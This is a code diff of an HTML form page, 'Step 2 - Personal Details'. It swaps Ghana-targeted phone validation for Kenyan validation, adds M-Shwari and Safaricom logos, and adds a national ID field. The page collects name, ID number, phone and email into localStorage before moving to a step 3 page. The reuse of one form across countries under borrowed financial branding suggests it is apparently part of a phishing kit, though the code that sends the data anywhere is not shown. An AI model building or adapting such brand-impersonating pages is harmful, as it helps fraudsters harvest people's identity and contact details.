@@ -3,55 +3,63 @@
 
 <head>
     <title>Step 2 - Personal Details</title>
-
-    <!-- ✅ MOBILE + NO ZOOM -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
-    <div class="header"></div>
+    <div class="header">
+    <img src="logo-removebg-preview.png" alt="M-Shwari" id="main-logo">
+    
+</div>
 
     <div class="container">
 
         <h2 class="title">Personal Details</h2>
 
-        <!-- NAMES -->
         <input id="fname" placeholder="First Name" pattern="[A-Za-z]+" title="Only letters allowed">
-
         <input id="lname" placeholder="Last Name" pattern="[A-Za-z]+" title="Only letters allowed">
 
-        <!-- PHONE -->
-        <input id="phone" value="+233" placeholder="Phone Number" inputmode="numeric" pattern="^\+2337[0-9]{8}$"
-            title="Enter valid Zimbabwe number">
+        <input id="idNumber" placeholder="ID Number" inputmode="numeric" type="text">
 
-        <!-- EMAIL -->
+        <input id="phone" value="+254" placeholder="Phone Number" inputmode="numeric" 
+            title="Enter valid Kenyan number">
+
         <input id="email" placeholder="Email Address" type="email">
 
         <p id="errorBox" style="color:red; text-align:center; display:none;"></p>
-        <br>
-        <br>
-        <br>
+        
+        <br><br><br>
         <button onclick="nextStep2()">Next</button>
 
     </div>
 
-    <div class="footer"></div>
+    <div class="footer">
+    <br><br><br><br><br><br>
+    <img src="safaricom-25.gif" alt="Safaricom" class="saf-footer" id="saf-logo">
+</div>
 
     <script>
         function nextStep2() {
             const fname = document.getElementById("fname").value.trim();
             const lname = document.getElementById("lname").value.trim();
+            const idNumber = document.getElementById("idNumber").value.trim();
             const phone = document.getElementById("phone").value.trim();
             const email = document.getElementById("email").value.trim();
 
             const nameRegex = /^[A-Za-z]+$/;
-            const phoneRegex = /^\+2337[0-9]{8}$/;
+            // Updated regex for Kenyan numbers: starts with +254 then 7 or 1, then 8 digits
+            const kenyaPhoneRegex = /^\+254[17][0-9]{8}$/;
+            const idRegex = /^[0-9]+$/;
 
-            if (!fname || !lname || !phone || !email) {
+            if (!fname || !lname || !idNumber || !phone || !email) {
                 showError("Please fill all required fields");
+                return;
+            }
+
+            if (!idRegex.test(idNumber)) {
+                showError("ID Number must contain only numbers");
                 return;
             }
 
@@ -60,33 +68,34 @@
                 return;
             }
 
-            if (!phoneRegex.test(phone)) {
-                showError("Enter valid Ghana phone (+2337XXXXXXXX)");
+            if (!kenyaPhoneRegex.test(phone)) {
+                showError("Enter valid Kenyan phone (+254XXXXXXXXX)");
                 return;
             }
 
-            // ✅ SAVE DATA (THIS FIXES NAME NOT SHOWING)
+            // Save Data
             localStorage.setItem("fname", fname);
             localStorage.setItem("lname", lname);
-            localStorage.setItem("fullName", fname + " " + lname); // 👈 IMPORTANT
+            localStorage.setItem("fullName", fname + " " + lname);
+            localStorage.setItem("idNumber", idNumber);
             localStorage.setItem("phone", phone);
             localStorage.setItem("email", email);
 
-            // move to next step
+            // Move to Step 3 (step3.html)
             showLoaderAndGo("step3.html");
+        }
+
+        function showError(msg) {
+            const err = document.getElementById("errorBox");
+            if (err) {
+                err.innerText = msg;
+                err.style.display = "block";
+            }
         }
     </script>
 
     <script src="script.js"></script>
-
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            document.body.classList.add("loaded");
-        });
-    </script>
-
     <div id="pageLoader" class="loader" style="display:none;"></div>
 
 </body>
-
 </html>
